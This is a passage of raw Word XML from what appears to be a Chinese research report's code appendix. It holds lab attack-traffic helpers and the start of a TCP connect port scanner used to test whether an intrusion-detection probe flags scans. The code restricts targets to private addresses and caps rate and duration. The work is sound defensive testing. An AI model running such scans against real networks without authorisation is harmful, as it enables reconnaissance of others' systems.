        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ap.error(f"{ip} 不是私有/回环地址。本工具只允许在实验网段使用。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398C92B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.duration &gt; 60:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0F269C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ap.error("--duration 上限 60 秒")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F21DD87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.rate &gt; 5000:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CAFBE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ap.error("--rate 上限 5000 包/秒")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD8640E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FF53284">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61133F2F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def resolve_self_ip(target: str) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B7196C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """探一条 UDP 路由拿到本机出口 IP（不发实际数据包）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C80471">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F68F819">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE27868">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        s.connect((target, 9))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74954BD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return s.getsockname()[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDCAB07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289F0FBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5D166F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A347B2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="362F26DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def pace(rate: float, sent: int, started: float) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60718888">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """按目标速率限速：睡到"按当前速率应该到达的时刻"。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA029C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    target_t = started + sent / rate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E29B78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    now = time.monotonic()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E24F04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if target_t &gt; now:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0346E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        time.sleep(target_t - now)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067ABA62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74ECF4A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06D70B50">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def require_root() -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AE1640">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE3A904">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12B129F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if os.geteuid() != 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE8A61C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sys.exit("构造原始包需要 root 权限")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5157108A">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A48EC24">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-11　attack/portscan.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（51 行）　M7 端口扫描（仅限授权网段）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB7C55E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""TCP connect 端口扫描复现（**仅限本人授权实验网段**）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8CA630">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="693B9204">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>对目标的一段端口逐个发起连接并立刻关闭，用来验证探针能否把 PortScan 认出来，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4C23C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>并给对照实验提供可知真值的流量。与 nmap 的区别只在于参数完全可控、便于复现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD0D583">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080BACF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08D8723C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34086507">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D55289E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DBE591">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE92899">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D3CFE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8CFF15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4FBCC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0649D592">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7BD2F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from attack.common import add_common_args, guard, pace  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434255F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="539E18DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60048AC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35315A23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="TCP 端口扫描（仅限授权实验网段）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7FC852">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    add_common_args(ap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BF0D14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--start", type=int, default=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FD1DEE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--end", type=int, default=1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F3F566">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = ap.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6A286B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    guard(ap, args)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1ADDD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D606F16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ports = list(range(args.start, args.end + 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF9A00C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[扫描] {args.target}:{args.start}-{args.end}，速率 {args.rate}/s，"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A290EAD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">          f"预计 {len(ports) / args.rate:.1f}s", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4EC64D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1837D72F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    started = time.monotonic()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D1C9F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    opened = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB3DEEE">
      <w:pPr>
        <w:widowControl w:val="0"/>
